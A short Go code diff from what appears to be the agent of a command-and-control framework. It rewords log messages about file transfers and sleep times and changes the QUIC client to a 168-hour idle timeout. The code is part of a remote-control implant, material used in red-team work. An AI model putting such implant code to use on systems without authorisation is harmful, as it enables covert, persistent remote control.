@@ -408,7 +408,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 							if a.Verbose {
 								message("success",fmt.Sprintf("Successfully download file to %s", p.FileLocation))
 							}
-							c.Stdout = fmt.Sprintf("Successfully uploaded file to %s on agent", p.FileLocation)
+							c.Stdout = fmt.Sprintf("Successfully uploaded file to %s on agent %s", p.FileLocation, a.ID.String())
 						}
 					}
 				}
@@ -528,7 +528,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 				os.Exit(0)
 			case "sleep":
 				if a.Verbose {
-					message("note", fmt.Sprintf("Setting agent sleep time to %s milliseconds", p.Args))
+					message("note", fmt.Sprintf("Setting agent sleep time to %s", p.Args))
 				}
 				t, err := time.ParseDuration(p.Args)
 				if err != nil {
@@ -620,7 +620,7 @@ func getClient(protocol string) (*http.Client, error) {
 
 	if protocol == "hq" {
 		transport := &h2quic.RoundTripper{
-			QuicConfig: &quic.Config{Versions: []quic.VersionNumber{quic.VersionGQUIC39}, IdleTimeout: 0},
+			QuicConfig: &quic.Config{IdleTimeout: 168 * time.Hour},
 			TLSClientConfig: TLSConfig,
 		}
 		return &http.Client{Transport: transport}, nil
